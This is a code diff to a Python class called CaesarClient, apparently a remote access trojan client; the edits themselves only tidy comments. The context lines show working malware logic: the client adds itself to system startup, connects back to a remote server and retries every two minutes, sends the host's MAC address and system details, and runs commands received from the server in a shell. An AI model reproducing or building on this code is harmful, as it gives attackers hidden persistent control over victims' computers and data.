@@ -38,7 +38,7 @@ class CaesarClient:
             #print(e)
 
 
-    # returns client system information to the server
+    # return client system information to the server
     def get_platform_info(self, conn):
         sys_info = {
             "mac-address": gma(),
@@ -56,7 +56,7 @@ class CaesarClient:
         conn.send(system_info_string.encode())
 
 
-    #tries to connect back to the server
+    # tries to connect back to the server
     def establish_connection(self):
         self.add_to_startup(os.path.abspath(sys.argv[0]))
 
@@ -66,7 +66,7 @@ class CaesarClient:
                 self.sock.connect((self.host, self.port))
                 break
             except socket.error as err:
-                time.sleep(120) #try to reconnect after 2 minutes
+                time.sleep(120) # try to reconnect after 2 minutes
 
         # send system info back to server
         self.get_platform_info(self.sock)
@@ -75,10 +75,11 @@ class CaesarClient:
         while True:
             cmd = self.sock.recv(65536).decode()
             if cmd == " ":
-                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode()) #send current working directory back to server
+                # send current working directory back to server
+                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}: ".encode())
 
             elif cmd[:2] == 'cd':
-                #change directory
+                # change directory
                 try:
                     os.chdir(cmd[3:])
                     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
